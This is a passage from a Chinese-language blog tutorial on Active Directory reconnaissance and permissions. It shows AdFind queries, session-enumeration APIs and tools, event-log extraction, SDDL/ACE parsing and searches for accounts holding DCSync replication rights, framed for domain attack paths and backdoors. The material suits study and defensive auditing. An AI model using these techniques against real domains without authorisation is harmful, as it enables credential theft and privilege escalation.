<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01359b16a3619b6b69.png"></p>
<p>或者直接抓hash 也是一样的。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt018ea38fc7e5c8d9cc.png"></p>
<h4 id="查找域内的所有机器"><a href="#查找域内的所有机器" class="headerlink" title="查找域内的所有机器"></a>查找域内的所有机器</h4><p>可以通过<code>objectclass=Computer</code>或者<code>objectcategory=Computer</code>查找域内的所有机器</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e35b57896aaad99b.png"></p>
<p>adfind 对查询计算机，提供了一些快捷方式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011f6d61516131b3a2.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016d99391843f63892.png"></p>
<p>域内的域控都在<code>Domain Controller</code>这个OU底下，可以通过查看这个OU里面的机器来找到域内的所有域控。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0123cb663229836662.png"></p>
<p>adfind 对查询域控，也提供了一些快捷方式。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a86d45d667736a9d.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0122e276146c7b2402.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a6cdd3bdf2ed54b6.png"></p>
<h3 id="域用户账户与机器用户的对应关系"><a href="#域用户账户与机器用户的对应关系" class="headerlink" title="域用户账户与机器用户的对应关系"></a>域用户账户与机器用户的对应关系</h3><h4 id="域用户默认能登录域内的任何一台普通机器"><a href="#域用户默认能登录域内的任何一台普通机器" class="headerlink" title="域用户默认能登录域内的任何一台普通机器"></a>域用户默认能登录域内的任何一台普通机器</h4><p>如果我们是自己搭建过域环境的话，应该会知道，默认情况底下，域用户是能够登录域内的任何一台机器用户的。我们在这里面探究一下原因。</p>
<p>在域成员机器的本地安全策略里面，默认情况底下，本地用户组允许本地登录。其中包括Users组。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fae424a1729a3d42.png"></p>
<p>其中Users组包括Domain Users</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt014c059b18478db24c.png"></p>
<p>而域内用户默认都在Domain Users组里面。</p>
<p>因为域用户默认都在Domain Users组里面，而Domain Users在Users组里面。默认情况底下Users组内的成员允许本地登录。所以域内成员默认都能登录域内任何一台机器。</p>
<p>对于这种情况，很多域内都没有解决这个问题。而有些域内运维意识到这个问题。一般会有这两种修改方案。</p>
<ol>
<li>在域用户这边做限制</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0183042ce3b6e82148.png"></p>
<p>设置域用户只允许登录到某台机器。</p>
<ol start="2">
<li>在机器这边做限制</li>
</ol>
<p>这个可以通过下发组策略实现。</p>
<p>因为一般都会把常登陆这台机器的域用户加入到<code>Administrators</code>组里面。不允许User组里面用户本地登录。把下图的Users删除掉。这样登陆这台机器的域用户，因为在Administrators组里面，也可以登录。而其他域用户也不能登录。</p>
<p>![](<a href="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fae424a1729a3d42">https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fae424a1729a3d42</a> (1).png)</p>
<h4 id="查看域用户能够登录的主机"><a href="#查看域用户能够登录的主机" class="headerlink" title="查看域用户能够登录的主机"></a>查看域用户能够登录的主机</h4><p>域用户默认能本地登录域内的任何一台主机。为了缓解这个问题。上一小节我们提出了两种解决方案。也会带来新的问题。我们可以根据这个找到域用户能够登录的主机。限制了域用户只能登录到某台主机之后，在LDAP里面，会设置一个字段，userWorkStation。这个字段保存了这个域用户只能登录到某台机器。而这个字段对于域内任何用户都是可读的，我们可以通过读域用户的userWorkStation来查看域用户限制登录到那一台机子。那个用户也就能够登录那台机子。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019504263021e8e453.png"></p>
<h4 id="查看域用户正在登陆的主机"><a href="#查看域用户正在登陆的主机" class="headerlink" title="查看域用户正在登陆的主机"></a>查看域用户正在登陆的主机</h4><p>当我们想寻找一个域用户正在登陆的主机的情况下，主要有以下几种方式</p>
<ol>
<li>检查远程机器注册表项里HKEY_USERS来查询谁正在登陆机器</li>
</ol>
<p>比如我们远程登录SERVER12的注册表，看到HKEY_USERS底下的key有<code>S-1-5-21-1909611416-240434215-3714836602-1113</code>，将<code>S-1-5-21-1909611416-240434215-3714836602-1113</code>这个sid转化为用户名是TEST\maria，就可以看到用户TEST\maria当前正在SERVER12这台机器上登录。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0125436dc9baeaeb6d.png"></p>
<p>远程查看注册表项这个操作可以通过API实现，我们可以遍历域内所有机器，查询机器正在登陆的用户。</p>
<p>值得注意的有:</p>
<ul>
<li>默认PC机器，是没有开启注册表远程连接的。Server 机器，默认开启远程连接。</li>
<li>域内任何用户，即使配置了，不能本地登录域内机器A，但是只要域内机器A开启远程注册表连接，我们就可以连接上机器A的注册表，从而枚举正在登陆的用户</li>
</ul>
<ol start="2">
<li>利用 NetSessionEnum 来寻找登陆的网络会话</li>
</ol>
<p>一个win32 API，关于这个API的细节可以看官方文档<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">NetSessionEnum function</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NET_API_STATUS NET_API_FUNCTION <span class="title function_">NetSessionEnum</span><span class="params">(</span></span><br><span class="line"><span class="params">  LMSTR   servername,</span></span><br><span class="line"><span class="params">  LMSTR   UncClientName,</span></span><br><span class="line"><span class="params">  LMSTR   username,</span></span><br><span class="line"><span class="params">  DWORD   level,</span></span><br><span class="line"><span class="params">  LPBYTE  *bufptr,</span></span><br><span class="line"><span class="params">  DWORD   prefmaxlen,</span></span><br><span class="line"><span class="params">  LPDWORD entriesread,</span></span><br><span class="line"><span class="params">  LPDWORD totalentries,</span></span><br><span class="line"><span class="params">  LPDWORD resume_handle</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这个API 的第一个参数servername ，可以指定一个远程的机器A，会去调用远程机器A的RPC。然后返回其他用户在访问机器A的网络资源（例如文件共享）时所创建的网络会话，可以看到这个用户来自何处。比如我们访问DC2016，会看到kangkang和jane 正在连接DC2016，而kangkang来自172.16.103.131,jane来自172.16.103.128</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0120cc8a6465bb5758.png"></p>
<p>值得注意的有:</p>
<ol>
<li><p>我们指定了servername 为机器A，并不能查询谁谁登陆了机器A，但是可以看到访问机器A的网络资源（例如文件共享）时所创建的网络会话。这个网络会话可以看到哪个域用户来自哪个IP，比如kangkang来自172.16.103.131，所以我们一般指定servername为域控或者文件共享服务器。</p>
</li>
<li><p>调用此函数的用户，指定了servername 为机器A，并不需要在机器A 上有管理员权限。所以域内任何用户都可以调用此函数，指定了servername 为域控。<br>利用NetWkstaUserEnum列出当前登录到该机器的所有用户的信息</p>
</li>
</ol>
<p>同样的，这也是一个WIN32 API，关于这个API的细节可以看官方文档<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmwksta/nf-lmwksta-netwkstauserenum">NetWkstaUserEnum function</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NET_API_STATUS NET_API_FUNCTION <span class="title function_">NetWkstaUserEnum</span><span class="params">(</span></span><br><span class="line"><span class="params">  LMSTR    servername,</span></span><br><span class="line"><span class="params">  IN DWORD level,</span></span><br><span class="line"><span class="params">  LPBYTE   *bufptr,</span></span><br><span class="line"><span class="params">  IN DWORD prefmaxlen,</span></span><br><span class="line"><span class="params">  LPDWORD  entriesread,</span></span><br><span class="line"><span class="params">  LPDWORD  totalentries,</span></span><br><span class="line"><span class="params">  LPDWORD  resumehandle</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这个API 的第一个参数servername 可以指定一个远程的机器A，会去调用远程机器A的RPC。然后返回当前登录到机器A的所有用户的信息.值得注意的是，调用该函数的用户需要具备机器A的本地管理员权限。</p>
<p>有一些现有的工具用来枚举正在登陆某台机子的用户(一般称为枚举会话)，其实本质上还是利用我们上面说的方法。这里举例几个</p>
<ol>
<li>psloggedon.exe</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01799916ea2ad56a53.png"></p>
<ol start="2">
<li>netsess.exe</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c83aa26a11c85938.png"></p>
<ol start="3">
<li>PVEFindADUser.exe</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt010252498e75ffad23.png"></p>
<ol start="4">
<li>hunter.exe</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015a5d5c875ff061d5.png"></p>
<h4 id="查看域用户登录过的主机"><a href="#查看域用户登录过的主机" class="headerlink" title="查看域用户登录过的主机"></a>查看域用户登录过的主机</h4><ol>
<li>通过查看outlook的邮件头</li>
</ol>
<p>当用户a 在公司内部使用outlook 给你发一封邮件的时候，我们可以在改邮件的头部看到用户a的内网IP</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01d6cb7bc49c182ec0.png"></p>
<ol start="2">
<li>导出DC日志</li>
</ol>
<p>这个要求我们有域控权限，比如说我们在拿到域控之后想找到域内某个用户的主机。</p>
<p>域内用户A在机器B正常登录的时候，由于本地没有域用户A的hash。机器B会去域控那边做验证，登录成功的话，在域控那边，会有个4624的日志，登录类型为3。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019076f5c2131d62d9.png"></p>
<p>值得注意的是，在域内可能存在多台域控，日志并不同步，请将每一台域控的日志都导出来。导出日志和查看日志有很多方式，这里提供一个实现。</p>
<p>导出日志，wevtutil是自带的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wevtutil epl Security C:\Users\Administrator\Desktop\1.evtx /q:“*[System[(EventID=4624)] and EventData[Data[@Name=‘LogonType’]=‘3’]]” //导出日志</span><br></pre></td></tr></table></figure>

<p>将日志拷贝到我们的电脑.使用LogParser开始提取日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LogParser.exe -i:EVT -o:CSV <span class="string">&quot;SELECT TO_UPPERCASE(EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;)) as USERNAME,TO_UPPERCASE(EXTRACT_TOKEN(Strings,18,&#x27;|&#x27;)) as SOURCE_IP FROM 1.evtx&quot;</span> &gt;log.csv // 提取日志</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0199daa16d1f50005e.png"></p>
<h2 id="域权限上"><a href="#域权限上" class="headerlink" title="域权限上"></a>域权限上</h2><h3 id="前言-11"><a href="#前言-11" class="headerlink" title="前言"></a>前言</h3><p>分成两块，这块主要是讲windows 域内的权限访问控制，这是上篇，主要有ACL,ACE相关的一些基础概念的介绍。</p>
<h3 id="windows-访问控制模型"><a href="#windows-访问控制模型" class="headerlink" title="windows 访问控制模型"></a>windows 访问控制模型</h3><p>在 Active Directory 中设置权限，其方式与在文件中设置权限的方式几乎相同。权限控制都是使用windows 访问控制模型。这里简单提一下windows 访问控制模型。</p>
<p>windows 访问控制模型是由两部分组成。</p>
<ul>
<li><p>访问令牌（Access Token）<br>包含用户的标识(User SID,Group SIDS)，以及特权列表。</p>
</li>
<li><p>安全描述符（security identifiers）。<br>被访问的安全对象的相关安全信息。<br>这里的安全对象包括但不限于</p>
</li>
<li><p>NTFS卷上的文件和目录</p>
</li>
<li><p>注册表项</p>
</li>
<li><p>网络共享</p>
</li>
<li><p>服务</p>
</li>
<li><p>Active Directory对象</p>
</li>
<li><p>进程等等</p>
</li>
</ul>
<p>由于这个系列都是讲域相关的。所以这篇文章的安全对象我们特指Active Directory对象。也就是AD 树上的每个条目。<br>如下图所示。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01a7d6cfc208a394dd.gif"></p>
<p>在域里面用户的身份上用sid 来表示而不是用用户名来查看，我们可以通过查看用户属性objectsid来查看一个用户的sid。</p>
<p>大体的流程是。当对象A来访问B的时候，A会出示自己的Access Token,然后包含自己的用户sid，自己所在的组的sid，以及特权列表。B这个安全对象，有自己的ACL。</p>
<ul>
<li><p>B首先判断是不是需要特权才能访问，如果需要特权，则查看A的Access Token看有没有那个特权。</p>
</li>
<li><p>B通过A的Access Token，来判断A的用户 sid以及组sids，跟自己的ACL做比对，来判断是否让A进行访问。关于ACL的更多细节，将在下一节具体阐述。</p>
</li>
</ul>
<h3 id="ACL-简介"><a href="#ACL-简介" class="headerlink" title="ACL 简介"></a>ACL 简介</h3><p>在前面说过，B通过A的Access Token，来判断A的用户 sid以及组sids，跟自己的ACL做比对，来判断是否让A进行访问。接下来详细介绍ACL。</p>
<p>ACL主要有两个作用：</p>
<ul>
<li><p>权限访问控制<br>  一个用户能不能访问安全对象</p>
</li>
<li><p>日志记录功能<br>  访问成功与否</p>
</li>
</ul>
<p>根据ACL的两个作用。ACL包含DACL和SACL。</p>
<ol>
<li>DACL</li>
</ol>
<p>DACL起到的作用是权限访问控制，也就是判断一个用户能不能访问安全对象。DACL 由若干条ACE构成。如下图所示，权限项目里面是一条又一条的ACE。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01db173de07f9509c2.png"></p>
<p>那DACL 是怎么判断用户能否访问呢。</p>
<p>我们来举个例子。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01efbf0de696e0724f.png"></p>
<p>SRM对acl的解析是</p>
<ol>
<li>明确定义的DENYACE。</li>
<li>明确定义的ALLOWACE</li>
<li>继承的DENYACE。</li>
<li>继承的ALLOWACE。</li>
</ol>
<p>在不考虑特权的情况底下。情况如下。</p>
<ul>
<li>当A 访问安全对象D的时候</li>
</ul>
<p>D 查看A的用户sid，以及组sids。首先到第二条(因为DENY优先于第一条的allow)进行匹配，没匹配上，然后到第一条ACE进行判断。允许sid 为50 的对象进行访问。A的用户sid 为50，因此允许A 对象访问。</p>
<ul>
<li>当B 访问安全对象D的时候</li>
</ul>
<p>D 查看B的用户sid，以及组sids。首先到第二条进行匹配，拒绝sid 为13的对象访问，发现B 的其中一个组sid 为13，拒绝B访问。</p>
<ul>
<li>当C 访问安全对象D的时候</li>
</ul>
<p>D 查看C的用户sid，以及组sids。首先到第二条ACE进行判断。没匹配上，然后匹配第一条，又没匹配上，因此拒绝C访问。</p>
<p>当每条ACE都没匹配上的时候，是拒绝访问的。因此值得注意的是，这里有两种情况</p>
<ol>
<li><p>ACE 条目的数量为0 的情况<br>这种情况底下，有DACL,但是ACE条目的数量为0，是不允许任何用户访问的</p>
</li>
<li><p>没有DACL的情况<br>这种情况，是允许任何用户访问的。</p>
</li>
</ol>
<ul>
<li>SACL<br>SACL的作用是记录访问成功与否，SACL也是由一条一条的ACE构成，每条ACE的内容是某个用户访问成功&#x2F;失败 某个权限。当访问跟满足这条ACE的时候就会被记录下来。</li>
</ul>
<h3 id="ACE-简介"><a href="#ACE-简介" class="headerlink" title="ACE 简介"></a>ACE 简介</h3><p>DACL 是由一条条的ACE构成。SACL也是由一条条的ACE构成，在这里我们只关心DACL的ACE。</p>
<p>在上面我们的举例里面，一条DACL的可能是这样。允许sid 为50 的用户访问。</p>
<p>这个是为了简单得描述。其实一条ACE的内容量远不止于此。可以把一条ACE归纳为四个方面。</p>
<ul>
<li>谁对你有权限</li>
<li>是允许还是拒绝</li>
<li>有什么权限</li>
<li>这个权限能不能被继承</li>
</ul>
<p>允许sid 为50 的用户访问。这个表述其实就解决了前面两个。谁对你有权限，是允许还是拒绝。</p>
<p>接下来我们主要来讲下后面两个</p>
<ol>
<li>有什么权限</li>
</ol>
<p>前面说能访问吗，其实是很笼统的说法。关于权限，大致可以划分为三个大的权限。</p>
<ul>
<li>通用权限<br>就是对这个条目的通用权限，通用读，通用写等。</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017c7c9903b4006142.png"></p>
<ul>
<li>对某个属性的权限<br>一个条目包含若干个属性，通用属性是对整个条目的权限。域内的ACL同时也支持某个属性的权限。</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01fc460ed7d6105e91.png"></p>
<ul>
<li>扩展权限<br>全面说的都是读写执行权限，但是域内的安全对象相对较为复杂，读写执行权限是不够用的，域内的ACL也支持扩展权限，比如强制更改密码。</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0160a2fb992819ffee.png"></p>
<ol start="2">
<li>这个权限能不能被继承</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015e50c463670f1951.png"></p>
<p>如上图所示，如果我们将权限作用作用于OU&#x3D;IT,如果设置这个权限能够继承的话，那这个权限能够作用于CN&#x3D;it-1。</p>
<h3 id="SDDL-简介"><a href="#SDDL-简介" class="headerlink" title="SDDL 简介"></a>SDDL 简介</h3><ul>
<li>存储位置  nTSecurityDescriptor</li>
<li>存储格式 SDDL(Security Descriptor Definition Language)</li>
</ul>
<p>利用adfind 查看某个属性的ACL</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;CN=PC-JACK-0DAY,CN=Computers,DC=0day,DC=org&quot;</span> nTSecurityDescriptor  -rawsddl</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016f6abe66edcbc8a0.png"></p>
<p>我们可以看到这一串看起来十分复杂的就是SDDL。看起来十分难以理解，接下来就让我们具体来分析一下。</p>
<p>SDDL 可以可以大致划分为一下四个部分。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">O:DA  ——&gt; ower</span><br><span class="line"></span><br><span class="line">G:DU  --&gt;Primary Group </span><br><span class="line"></span><br><span class="line">D:</span><br><span class="line">(A;CIID;GW;;;S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span><span class="number">-1103</span>)</span><br><span class="line">(OA;;WP;bf967950<span class="number">-0</span>de6<span class="number">-11</span>d0-a285<span class="number">-00</span>aa003049e2;bf967a86<span class="number">-0</span>de6<span class="number">-11</span>d0-a285<span class="number">-00</span>aa003049e2;S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span><span class="number">-1133</span>)</span><br><span class="line"></span><br><span class="line">S:</span><br><span class="line">(OU;CIIOIDSA;WP;f30e3bbe<span class="number">-9f</span>f0<span class="number">-11</span>d1-b603<span class="number">-0000f</span>80367c1;bf967aa5<span class="number">-0</span>de6<span class="number">-11</span>d0-a285<span class="number">-00</span>aa003049e2;WD)(OU;CIIOIDSA;WP;f30e3bbf<span class="number">-9f</span>f0<span class="number">-11</span>d1-b603<span class="number">-0000f</span>80367c1;bf967aa5<span class="number">-0</span>de6<span class="number">-11</span>d0-a285<span class="number">-00</span>aa003049e2;WD)</span><br></pre></td></tr></table></figure>

<p>其中O代表这条ACL的所有者</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01bde7f276875a119a.png"></p>
<p>G表示<code>primary group，Windows</code> 通常忽略此参数（这是为了 POSIX 兼容性，但它现在已经退化了)</p>
<p>然后剩下的两个部分就是DACL和SACL,都是由一条一条的ACE构成(在SDDL里面一个括号代表一条ACE)，这里侧重点说的是DACL的ACE。</p>
<p>先看第一个例子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(A;CIID;GW;;;S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span><span class="number">-1103</span>)</span><br></pre></td></tr></table></figure>

<p>我们前面说过，DACL的ACE的作用主要可以分为</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0177ccf5bad5828e30.png"></p>
<ol>
<li>通用权限<br>然后我们将ACE拆开。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">A;  ACE类型（允许/拒绝/审核）</span><br><span class="line">CI; ACE标志（继承和审核设置）</span><br><span class="line">GW; 权限（增量权限列表）</span><br><span class="line">; 对象类型（GUID）</span><br><span class="line">; 继承的对象类型（GUID）</span><br><span class="line">S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span><span class="number">-1103</span> 受托人SID</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<ul>
<li><p>谁对你有权限<br>sid 为 S-1-5-21-1812960810-2335050734-3517558805-1103的用户</p>
</li>
<li><p>是允许还是拒绝<br>根据ACE类型可以看到是允许</p>
</li>
<li><p>有什么权限<br>GW 表示是通用权限</p>
</li>
<li><p>这个权限能不能被继承<br>CI 表示权限可以被继承<br>关于这些值的解释可以看<a href="https://clan8blog.wordpress.com/2016/08/08/sddl-explained/">https://clan8blog.wordpress.com/2016/08/08/sddl-explained/</a></p>
</li>
</ul>
<ol start="2">
<li>扩展权限<br>上面代表的是通用权限的情况，但是还有对某个属性的权限，以及扩展权限两种。看下面一个例子。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(</span><br><span class="line">OA; ACE类型（允许/拒绝/审核）</span><br><span class="line">; ACE标志（继承和审核设置）</span><br><span class="line">CR; 权限（增量权限列表）</span><br><span class="line"><span class="number">00299570</span><span class="number">-246</span>d<span class="number">-11</span>d0-a768<span class="number">-00</span>aa006e0529; 对象类型（GUID）</span><br><span class="line">; 继承的对象类型（GUID）</span><br><span class="line">S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span><span class="number">-1178</span> 受托人SID</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>这个是扩展权限的，相较于通用权限，对某个属性的权限，以及扩展权限这两种权限的话，</p>
<p>我们可以看到主要是多了个GUID(00299570-246d-11d0-a768-00aa006e0529),我们查下这个GUID(00299570-246d-11d0-a768-00aa006e0529)是强制更改密码，因此这个权限是扩展权限，强制更改密码。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01db86aed6c6e38ba2.png"></p>
<p>对于某个具体属性的权限或者扩展权限，是哪个属性或者是哪个扩展权限，体现在对象类型里面，类型是GUID。</p>
<p>对于扩展权限，都存储在<code>CN=Extended-Rights,CN=Configuration,DC=test,DC=local</code>里面,具体在rightsGuid这个属性里面，是字符串属性</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01c34832e335445a4c.png"></p>
<p>如果我们已知GUID查询扩展权限的名字，可以通过这样查询</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adfind -b <span class="string">&quot;CN=Extended-Rights,CN=Configuration,DC=test,DC=local&quot;</span> -f <span class="string">&quot;rightsGuid=00299570-246d-11d0-a768-00aa006e0529&quot;</span> name</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013c3c867bdddfb820.png"></p>
<ol start="3">
<li>对某个属性的权限<br>对哪个属性的权限，也是用GUID 体现出来的，之前我们说过，所有属性的都存储在结构分区里面，可以以此作为查询</li>
</ol>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e8faef680788e11c.png"></p>
<p>如果我们已知GUID要查询属性的名字，可以通过这样查询</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">adfind -schema -f <span class="string">&quot;schemaIDGUID=&#123;&#123;GUID:BF9679C0-0DE6-11D0-A285-00AA003049E2&#125;&#125;&quot;</span> -binenc  name</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt017a20487abbaa854b.png"></p>
<p>但是SDDL的可阅读性实在太差了，Adfind 可以更方便阅读一点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;CN=PC-JACK-0DAY,CN=Computers,DC=0day,DC=org&quot;</span> nTSecurityDescriptor  -sddl</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01235283dc9465930e.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b <span class="string">&quot;CN=PC-JACK-0DAY,CN=Computers,DC=0day,DC=org&quot;</span> nTSecurityDescriptor  -sddl+++(+阅读，越容易阅读，最高三个+)</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b2f26bb610c5538b.png"></p>
<h3 id="利用adfind-过滤-ACL"><a href="#利用adfind-过滤-ACL" class="headerlink" title="利用adfind 过滤 ACL"></a>利用adfind 过滤 ACL</h3><p>如果想用adfind 过滤ACL的话，我们可以使用<code>-sddlfilter</code>,语法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">-sddlfilter ;;;;;</span><br></pre></td></tr></table></figure>

<p>后面跟的参数对应的是ace条目相应的参数，值得注意的是，过滤的格式跟输出的格式要保持一致。</p>
<p>如果-rawsddl ，最后一个参数是sid，这个时候用-sddlfilter进行过滤，最后一个参数就要用sid的形式。</p>
<p>如果是-sddl+++，最后一个参数已经解析后账号名，这个时候用-sddlfilter进行过滤，最后一个参数就要用账号名的形式。</p>
<p>下面举几个例子</p>
<ol>
<li>查找某个对象在域内的ACL权限</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b <span class="string">&quot;DC=test,DC=local&quot;</span> nTSecurityDescriptor   -sddl+++   -sddlfilter ;;;;;<span class="string">&quot;TEST\DC2016$&quot;</span>   -recmute</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01820587bbe037011c.png"></p>
<ol start="2">
<li>查找更改一个对象的马上到！S-AllowedToActOnBehalfOfOtherIdentity的权限</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AdFind.exe -s subtree -b <span class="string">&quot;DC=test,DC=local&quot;</span> nTSecurityDescriptor   -sddl++   -sddlfilter ;;;<span class="string">&quot;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;</span>;;  -recmute</span><br></pre></td></tr></table></figure>

<p>AdFind.exe -s subtree -b “DC&#x3D;test,DC&#x3D;local” nTSecurityDescriptor   -sddl++   -sddlfilter ;;;”msDS-AllowedToActOnBehalfOfOtherIdentity”;;  -recmute</p>
<ol start="3">
<li>查找域内具备dcync 权限的用户</li>
</ol>
<p>对域对象只需要具备一下这两个权限，就有dcsync的权限。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes&#x27;</span>     = <span class="number">1131f</span>6aa<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br><span class="line"><span class="string">&#x27;DS-Replication-Get-Changes-All&#x27;</span> = <span class="number">1131f</span>6ad<span class="number">-9</span>c07<span class="number">-11</span>d1-f79f<span class="number">-00</span>c04fc2dcd2</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt013783aa074686a3cf.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01783c2e12d6384581.png"></p>
<p>开始进行搜索</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt011c3a109eabb651d5.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt015d193bee48b235f1.png"></p>
<h2 id="域权限下"><a href="#域权限下" class="headerlink" title="域权限下"></a>域权限下</h2><h3 id="前言-12"><a href="#前言-12" class="headerlink" title="前言"></a>前言</h3><p>这一块主要有SeEnableDelegationPrivilege特权，一些高危ACL以及AdminSDHolder的介绍，可用于域内的ACL路径攻击以及留作后门。</p>
<h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><p>在上一篇windows 访问控制模型的时候，有讲到过，A访问B,首先判断安全对象B是不是需要特权才能访问，如果需要特权，则查看A的Access Token看有没有那个特权。。</p>
<p>如果我们需要赋予域用户特权一般都是通过组策略下发。比如说默认情况底下的<code>Default Domain Controllers Policy(GUID=&#123;6AC1786C-016F-11D2-945F-00C04FB984F9&#125;)</code>这条组策略会把<code>SeEnableDelegationPrivilege</code>这个特权赋予<code>Administrators</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt016923bca2594cd1e9.png"></p>
<p>而查询一个用户具备的特权，可以用<code>whoami /priv</code>来查看</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt019f8d709741d32a0f.png"></p>
<p>然后这里着重介绍一个特权<code>SeEnableDelegationPrivilege</code>,其实特权这个东西不止是域，在整个windows安全体系里面都很重要，有兴趣可以深入研究下。</p>
